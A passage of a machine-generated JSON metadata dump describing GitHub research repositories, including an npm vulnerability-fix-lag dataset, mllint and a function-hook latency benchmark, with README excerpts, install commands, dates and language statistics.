                    "value": "Dataset for RQ1 represents the fixing release update of packages and client-side fixing release update of clients.\nEach file contains one JSON array.\nInstances in an array are clients that directly depend on a vulnerable package.\n- [Script for RQ1](RQ1/RQ1.py)\n- [Download tarball of RQ1 dataset](RQ1/rq1_data.tar.gz)\n\nThe following table shows the structure of RQ1 dataset.\n\n| Key         | Description                                                   |\n|-------------|---------------------------------------------------------------|\n| client_name | Client name                                                   |\n| vul_lib_ver | Vulnerable version of library adopted by client               |\n| fix_lib_ver | Fixed version of library adopted by client                    |\n| adoption    | Fix adoption of client                                        |\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Dataset for RQ1",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes",
                        "Processed Dataset"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
                    "value": "Dataset for RQ2 represents lags in propagation.\nEach file contains one JSON array.\nInstances in an array are downstream clients that depend on a vulnerable package.\n- [Script for RQ2](RQ2/RQ2.py)\n- [Download tarball of RQ2 dataset](RQ2/rq2_data.tar.gz)\n\nThe following table shows the structure of RQ2 dataset.\n\n| Key        | Description                                                |\n|------------|------------------------------------------------------------|\n| name       | Client name                                                |\n| dependency | Direct dependency name of the client                       |\n| downstream_propagation  | Proximity between vulnerable library and downstream client |\n| lags_day   | Lags of updates (days)                                     |\n",
                    "type": "Text_excerpt",
                    "original_header": "Dataset for RQ2",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes",
                        "Processed Dataset"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
                    "value": "- [Springer](https://link.springer.com/article/10.1007%2Fs10664-021-09951-x)\n- [arXiv.org](https://arxiv.org/abs/1907.03407)\n- [Researchgate.net](https://www.researchgate.net/publication/350509622_Lags_in_the_release_adoption_and_propagation_of_npm_vulnerability_fixes)\n",
                    "type": "Text_excerpt",
                    "original_header": "Link to paper",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
                    "value": "- [Bodin Chinthanet](https://bchinthanet.com)\n- [Raula Gaikovina Kula](https://raux.github.io/)\n- [Shane McIntosh](http://shanemcintosh.org/)\n- [Takashi Ishio](https://takashi-ishio.github.io/)\n- [Akinori Ihara](http://web.wakayama-u.ac.jp/~ihara/)\n- [Kenichi Matsumoto](https://matsumotokenichi.github.io/)\n",
                    "type": "Text_excerpt",
                    "original_header": "Authors",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-02-14T03:03:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-06-02T04:35:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 11104
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "504": {
        "filename": "Spirals-Team_jPerturb-experiments_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Spirals-Team/correctness-attraction-experiments",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the gui on zip:\n```\nmvn exec:java -Dexec.mainClass=\"experiment.Main\" -Dexec.args=\"-s zip -run gui\"\n```\n \n",
                    "original_header": "GUI"
                },
                "confidence": 0.9983629528435878,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/jPerturb-experiments/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-03-30T12:32:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2018-11-27T21:16:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 483647
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 56382
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 48930
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 9006
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2206
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "505": {
        "filename": "dattasiddhartha_DeepObfusCode_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dattasiddhartha/DeepObfusCode",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[pip](https://pypi.org/project/deepobfuscode/) package also available. \nImport `deepobfuscode` as library, and install required dependencies. [Obfuscation tests](https://github.com/dattasiddhartha-1/dsource) for reference. \n",
                    "original_header": "DeepObfusCode"
                },
                "confidence": 0.981966207291451,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dattasiddhartha/DeepObfusCode/main/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-26T14:27:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-27T02:13:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 12968
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "506": {
        "filename": "salab_RefactorHub_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/salab/RefactorHub",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-09-15T12:27:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-27T04:23:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 231367
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 184037
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 104064
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 635
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 571
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 225
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Procfile",
                    "name": "Procfile",
                    "type": "Programming_language",
                    "size": 32
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 16
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "507": {
        "filename": "sola-st_MetaCodeSum_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sola-st/MetaCodeSum",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-20T16:06:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-17T11:16:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 48423
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3107
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "508": {
        "filename": "bvobart_mllint_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bvobart/mllint",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "---\ntitle: \"Installation\"\ndescription: \"Options for installing `mllint`\"\nweight: 5\nsummary: \"mllint is compiled for Linux, MacOS and Windows and is published to [PyPI](https://pypi.org/project/mllint/), so it can be installed using `pip install -U mllint` Alternatively, use one of the Docker containers at `bvobart/mllint`\"\n---\n\n`mllint` is compiled for Linux, MacOS and Windows, both 64 and 32 bit x86 (MacOS 64-bit only), as well as 64-bit ARM on Linux and MacOS (Apple M1).\n\n`mllint` is published to [PyPI](https://pypi.org/project/mllint/), so it can be installed globally or in your current environment using `pip`:\n```sh\npip install --upgrade mllint\n```\n\nAlternatively, to add `mllint` to an existing project, if your project uses Poetry for its dependencies:\n```sh\npoetry add --dev mllint\n```\n\nOr if your project uses Pipenv:\n```sh\npipenv install --dev mllint\n```\n\n### Tools\n\n`mllint` has a soft dependency on several Python tools that it uses for its analysis. While `mllint` will recommend that you place these tools in your project's development dependencies, these tools are listed as optional dependencies of `mllint` and can be installed along with `mllint` using:\n\n```sh\npip install --upgrade mllint[tools]\n```\n\n### Docker\n\nThere are also `mllint` Docker containers available on [Docker Hub](https://hub.docker.com/r/bvobart/mllint) at `bvobart/mllint` for Python 3.6, 3.7, 3.8 and 3.9. These may particularly be helpful when running `mllint` in CI environments, such as Gitlab CI or Github Actions. See the Docker Hub for a full list of available tags that can be used.\n\nThe Docker containers require that you mount the folder with your project onto the container as a volume on `/app`. Here is an example of how to use this Docker container, assuming that your project is in the current folder. Replace `$(pwd)` with the full path to your project folder if it is somewhere else.\n\n```sh\ndocker run -it --rm -v $(pwd):/app bvobart/mllint:latest\n```\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/docs/gh-pages/content/docs/installation.md"
            },
            {
                "result": {
                    "value": "`mllint` is compiled for Linux, MacOS and Windows, both 64 and 32 bit x86 (MacOS 64-bit only), as well as 64-bit ARM on Linux and MacOS (Apple M1).\n\n`mllint` is published to [PyPI](https://pypi.org/project/mllint/), so it can be installed globally or in your current environment using `pip`:\n```sh\npip install --upgrade mllint\n```\n\nAlternatively, to add `mllint` to an existing project, if your project uses Poetry for its dependencies:\n```sh\npoetry add --dev mllint\n```\n\nOr if your project uses Pipenv:\n```sh\npipenv install --dev mllint\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "<a href=\"https://bvobart.github.io/mllint/\">`mllint` \u2014 Linter for Machine Learning projects</a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "value": "`mllint` has a soft dependency on several Python tools that it uses for its analysis. While `mllint` will recommend that you place these tools in your project's development dependencies, these tools are listed as optional dependencies of `mllint` and can be installed along with `mllint` using:\n\n```sh\npip install --upgrade mllint[tools]\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Tools",
                    "parent_header": [
                        "<a href=\"https://bvobart.github.io/mllint/\">`mllint` \u2014 Linter for Machine Learning projects</a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "value": "There are also `mllint` Docker containers available on [Docker Hub](https://hub.docker.com/r/bvobart/mllint) at `bvobart/mllint` for Python 3.6, 3.7, 3.8 and 3.9. These may particularly be helpful when running `mllint` in CI environments, such as Gitlab CI or Github Actions. See the Docker Hub for a full list of available tags that can be used.\n\nThe Docker containers require that you mount the folder with your project onto the container as a volume on `/app`. Here is an example of how to use this Docker container, assuming that your project is in the current folder. Replace `$(pwd)` with the full path to your project folder if it is somewhere else.\n\n```sh\ndocker run -it --rm -v $(pwd):/app bvobart/mllint:latest\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Docker",
                    "parent_header": [
                        "<a href=\"https://bvobart.github.io/mllint/\">`mllint` \u2014 Linter for Machine Learning projects</a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  <img alt=\"GitHub Workflow Status\" src=\"https://img.shields.io/github/workflow/status/bvobart/mllint/Build%20mllint%20and%20upload%20to%20PyPI\">\n  <img alt=\"GitHub go.mod Go version\" src=\"https://img.shields.io/github/go-mod/go-version/bvobart/mllint\">\n  <a href=\"https://pkg.go.dev/github.com/bvobart/mllint\"><img src=\"https://pkg.go.dev/badge/github.com/bvobart/mllint.svg\" alt=\"Go Reference\"></a>\n  <a href=\"https://codecov.io/gh/bvobart/mllint\"><img alt=\"Code coverage\" src=\"https://codecov.io/gh/bvobart/mllint/branch/main/graph/badge.svg?token=K9PJMGMFVI\"/></a>\n  <a href=\"https://goreportcard.com/report/github.com/bvobart/mllint\"><img alt=\"GoReportCard\" src=\"https://goreportcard.com/badge/github.com/bvobart/mllint\"/></a>\n  <img alt=\"Platform\" src=\"https://img.shields.io/badge/platform-Linux%20%7C%20MacOS%20%7C%20Windows-informational\">\n</p>\n<p align=\"center\">\n  <a href=\"https://pypi.org/project/mllint/\"><img alt=\"PyPI\" src=\"https://img.shields.io/pypi/v/mllint\"></a>\n  <a href=\"https://pypi.org/project/mllint/\"><img alt=\"PyPI - Status\" src=\"https://img.shields.io/pypi/status/mllint\"></a>\n  <a href=\"https://pypi.org/project/mllint/\"><img alt=\"PyPI - Downloads - Daily\" src=\"https://img.shields.io/pypi/dd/mllint\"></a>\n  <a href=\"https://pypi.org/project/mllint/\"><img alt=\"PyPI - Downloads - Monthly\" src=\"https://img.shields.io/pypi/dm/mllint\"></a>\n  <a href=\"https://pypi.org/project/mllint/\"><img alt=\"PyPI - Python Version\" src=\"https://img.shields.io/pypi/pyversions/mllint\"></a>\n</p> \n<p align=\"center\"><img src=\"./docs/gh-pages/static/example-run.svg\"></p> \n## Installation \n`mllint` is compiled for Linux, MacOS and Windows, both 64 and 32 bit x86 (MacOS 64-bit only), as well as 64-bit ARM on Linux and MacOS (Apple M1). \n`mllint` is published to [PyPI](https://pypi.org/project/mllint/), so it can be installed globally or in your current environment using `pip`:\n```sh\npip install --upgrade mllint\n``` \nAlternatively, to add `mllint` to an existing project, if your project uses Poetry for its dependencies:\n```sh\npoetry add --dev mllint\n``` \nOr if your project uses Pipenv:\n```sh\npipenv install --dev mllint\n``` \n`mllint` has a soft dependency on several Python tools that it uses for its analysis. While `mllint` will recommend that you place these tools in your project's development dependencies, these tools are listed as optional dependencies of `mllint` and can be installed along with `mllint` using:\n```sh\npip install --upgrade mllint[tools]\n```\n \nThe Docker containers require that you mount the folder with your project onto the container as a volume on `/app`. Here is an example of how to use this Docker container, assuming that your project is in the current folder. Replace `$(pwd)` with the full path to your project folder if it is somewhere else.\n```sh\ndocker run -it --rm -v $(pwd):/app bvobart/mllint:latest\n```\n \n`mllint` is designed to be used both on your personal computer as well as on CI systems. So, open a terminal in your project folder and run one of the following commands, or add it to your project's CI script. \nTo run `mllint` on the project in the current folder, simply run:\n```sh\nmllint\n``` \nTo run `mllint` on a project in another folder, simply run:\n```sh\nmllint path/to/my-ml-project\n``` \n`mllint` will analyse your project and create a Markdown-formatted report of its analysis. By default, this will be pretty printed to your terminal.  \nIf you instead prefer to export the raw Markdown text to a file, which may be particularly useful when running on CI, the `--output` or `-o` flag and provide a filename. `mllint` does not overwrite the destination file if it already exists, unless `--force` or `-f` is used. For example:\n```sh\nmllint --output report.md\n``` \nUsing `-` (a dash) as the filename prints the raw Markdown directly to your terminal:\n```sh\nmllint -o -\n``` \nIn CI scripts, such raw markdown output (whether as a file or printed to the standard output) can be used to e.g. make comments on pull/merge requests or create Wiki pages on your repository. \nTo list all available (implemented) categories and linting rules, run:\n```sh\nmllint list all\n``` \nTo list all enabled linting rules, run (optionally providing the path to the project's folder):\n```sh\nmllint list enabled\n``` \n## Configuration \n`mllint` can be configured either using a `.mllint.yml` file or through the project's `pyproject.toml`. This allows you to:\n- selectively disable specific linting rules or categories using their slug\n- define custom linting rules\n- configure specific settings for various linting rules. \n",
                    "original_header": "<a href=\"https://bvobart.github.io/mllint/\">`mllint` \u2014 Linter for Machine Learning projects</a>"
                },
                "confidence": 0.977123846858626,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See the code snippets and commands provided below for examples of such configuration files.\n \n",
                    "original_header": "Configuration"
                },
                "confidence": 0.994080821358813,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To print `mllint`'s current configuration in YAML format, run (optionally providing the path to the project's folder):\n```sh\nmllint config\n``` \nTo print `mllint`'s default configuration in YAML format, run (unless there is a folder called `default` in the current directory):\n```sh\nmllint config default\n``` \n",
                    "original_header": "<a href=\"https://bvobart.github.io/mllint/\">`mllint` \u2014 Linter for Machine Learning projects</a>"
                },
                "confidence": 0.9983098893560199,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To create a `.mllint.yml` file from `mllint`'s default configuration, run:\n```sh\nmllint config default -q > .mllint.yml\n```\n \n",
                    "original_header": "Commands"
                },
                "confidence": 0.9998011493361695,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "An example `.mllint.yml` that disables some rules looks as follows:\n```yaml\nrules:\n  disabled:\n    - version-control/code/git\n    - dependency-management/single\n```\n \nAn example `pyproject.toml` configuration of `mllint` is as follows. Note that it is identical to the YAML example above.\n```toml\n[tool.mllint.rules]\ndisabled = [\"version-control/code/git\", \"dependency-management/single\"]\n```\n \nTo run `mllint` from source, install the latest version of Go for your operating system, then clone this repository and run `go run .` in the root of this repository. Use `go test ./...` or execute `test.sh` to run all of `mllint`'s tests. \nTo test compiling and packaging `mllint` into a Python wheel for your current platform, run `test.package.sh`.\n \n",
                    "original_header": "<a href=\"https://bvobart.github.io/mllint/\">`mllint` \u2014 Linter for Machine Learning projects</a>"
                },
                "confidence": 0.981414083856651,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bvobart/mllint/main/ReadMe.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-02T20:08:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-25T21:10:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 366535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 7992
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1620
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 330
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "509": {
        "filename": "dynatrace-research_function-hook-latency-benchmarking_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dynatrace-research/function-hook-latency-benchmarking",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\ud83d\udcac If you have suggestions on how to improve these recommendations, please let us know by opening an issue or a pull request.\n \n",
                    "original_header": "Recommendations from the paper"
                },
                "confidence": 0.9830965541864747,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In the following, we demonstrate how to reproduce the experiments of our paper.\nAs a prerequisite, you will need to install the following tools: \n",
                    "original_header": "Demonstration"
                },
                "confidence": 0.9973339870510042,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This repository already includes a **pre-built version of the function hook in [`/hook/out/readhook.so`](`/hook/out/readhook.so`)** making this step optional.\nFor building, we use a rather old `gcc:7.5.0` image so that we build the hook against an older version of the C standard library (GLIBC 2.28).\nThis way, we have greater backwards compatibility with applications that use older versions of the C standard library. \nIn Bash, to build the hook in a container and copy it to the host system, run:\n```sh\ncd hook\ndocker build -t readhook .\nid=$(docker create readhook)\ndocker cp $id:/out/readhook.so ./out/readhook.so\ndocker rm -v $id\n```\nIn PowerShell, to build the hook in a container and copy it to the host system, run:\n```sh\ncd hook\ndocker build -t readhook .\n$Id = docker create readhook\ndocker cp \"$($Id):/out/readhook.so\" ./out/readhook.so\ndocker rm -v $Id\n```\n \n",
                    "original_header": "Building the function hook"
                },
                "confidence": 0.9999013841022086,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First, let Compose build and start the containers:\n```sh\ncd benchmark\ndocker compose up -d\n```\n \n- One with the host `http://host.docker.internal:8080` (no trailing slash) to test the SUT without the hook\n- One with the host `http://host.docker.internal:8081` (no trailing slash) to test the SUT with the hook \nTo clean up again, run:\n```sh\ndocker compose down\n```\n \n",
                    "original_header": "\ud83d\udc0b Experiment 1: Docker"
                },
                "confidence": 0.9656623116867326,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- One with the host `http://localhost:8080` (no trailing slash) to test the SUT without the hook\n- One with the host `http://localhost:8081` (no trailing slash) to test the SUT with the hook \nTo clean up again, run:\n```sh\nkind delete cluster --name benchmark\n```\n \n",
                    "original_header": "\ud83d\udef3\ufe0f Experiment 2: Kind"
                },
                "confidence": 0.9770558237660046,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_Before continuing, make sure that you read the prerequisites for experiments in AWS EKS from before._ \nLet's start by creating a namespace for our benchmark:\n```sh\nkubectl create namespace benchmark\n```\nThen, we take the `aws-single-pod.template.yaml` manifest and need to change the `REPOSITORY_URL` variable and deploy it.\nIf you use Windows, change this value manually in the file. With Bash, you can use the following command:\n```sh\ncd benchmark\nexport AWS_ACCOUNT_ID=YOUR_AWS_ACCOUNT_ID\nexport REGION=YOUR_AWS_REGION\ncat ./k8s-manifests/aws-single-pod.template.yaml \\\n  | sed -e 's@${REPOSITORY_URL}@'\"${AWS_ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com\"'@g' \\\n  | kubectl apply -n benchmark -f -\n```\nNext, wait for the deployment and then port-forward the Locust UI locally:\n```sh\nkubectl rollout status deployment tb-single-pod -n benchmark --timeout=60s\nkubectl port-forward -n benchmark service/locust 8089:8089\n```\n \nIn Bash, run the following:\n```sh\npodname=$(kubectl get pods -n benchmark --selector=app.kubernetes.io/name=tb-single-pod --no-headers -o custom-columns=\":metadata.name\")\nkubectl cp -c test-bench \"benchmark/$($PodName):/tmp/benchmark_results\" ./benchmark_results\n```\nIn PowerShell, run the following:\n```sh\n$PodName = kubectl get pods -n benchmark --selector=app.kubernetes.io/name=tb-single-pod --no-headers -o custom-columns=\":metadata.name\"\nkubectl cp -c test-bench \"benchmark/$($PodName):/tmp/benchmark_results\" ./benchmark_results\n```\nTo clean up again, run:\n```sh\nkubectl delete all --all -n benchmark\n```\n \n",
                    "original_header": "\u2693 Experiment 3: AWS EKS with SUT and load generator in a single pod"
                },
                "confidence": 0.9695964880160916,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Let's start by creating a namespace for our benchmark:\n```sh\nkubectl create namespace benchmark\n```\nWe need to note down the hostnames of at least two different nodes in our cluster:\n```sh\nkubectl get nodes --no-headers -o custom-columns=\":metadata.name\"\nexport NODE_HOSTNAME_FOR_LOCUST=MANUALLY_COPY_THE_FIRST_HOSTNAME_FROM_ABOVE\nexport NODE_HOSTNAME_FOR_SUT=MANUALLY_COPY_THE_SECOND_HOSTNAME_FROM_ABOVE\n```\nThen, we take the `aws-different-nodes.template.yaml` manifest and need to change the `REPOSITORY_URL`, `NODE_HOSTNAME_FOR_LOCUST`, and `NODE_HOSTNAME_FOR_SUT` variables and deploy it.\nIf you use Windows, change these values manually in the file. With Bash, you can use the following command:\n```sh\ncd benchmark\nexport AWS_ACCOUNT_ID=YOUR_AWS_ACCOUNT_ID\nexport REGION=YOUR_AWS_REGION\ncat ./k8s-manifests/aws-different-nodes.template.yaml \\\n  | sed -e 's@${REPOSITORY_URL}@'\"${AWS_ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com\"'@g' \\\n  | sed -e 's@${NODE_HOSTNAME_FOR_LOCUST}@'\"${NODE_HOSTNAME_FOR_LOCUST}\"'@g' \\\n  | sed -e 's@${NODE_HOSTNAME_FOR_SUT}@'\"${NODE_HOSTNAME_FOR_SUT}\"'@g' \\\n  | kubectl apply -n benchmark -f -\n```\nNext, wait for the deployment and then port-forward the Locust UI locally:\n```sh\nkubectl rollout status deployment tb-locust-node -n benchmark --timeout=60s\nkubectl port-forward -n benchmark service/locust 8089:8089\n```\n \n- One with the host `http://sut.benchmark.svc.cluster.local:8080` (no trailing slash) to test the SUT without the hook\n- One with the host `http://sut.benchmark.svc.cluster.local:8081` (no trailing slash) to test the SUT with the hook \nIn Bash, run the following:\n```sh\npodname=$(kubectl get pods -n benchmark --selector=app.kubernetes.io/name=tb-locust-node --no-headers -o custom-columns=\":metadata.name\")\nkubectl cp -c test-bench \"benchmark/$($PodName):/tmp/benchmark_results\" ./benchmark_results\n```\nIn PowerShell, run the following:\n```sh\n$PodName = kubectl get pods -n benchmark --selector=app.kubernetes.io/name=tb-locust-node --no-headers -o custom-columns=\":metadata.name\"\nkubectl cp -c test-bench \"benchmark/$($PodName):/tmp/benchmark_results\" ./benchmark_results\n```\nTo clean up again, run:\n```sh\nkubectl delete all --all -n benchmark\n```\n \n",
                    "original_header": "\ud83d\udd31 Experiment 4: AWS EKS with SUT and load generator in separate pods, each pod on a different node"
                },
                "confidence": 0.9878086781637859,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dynatrace-research/function-hook-latency-benchmarking/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-13T11:14:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-13T20:31:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
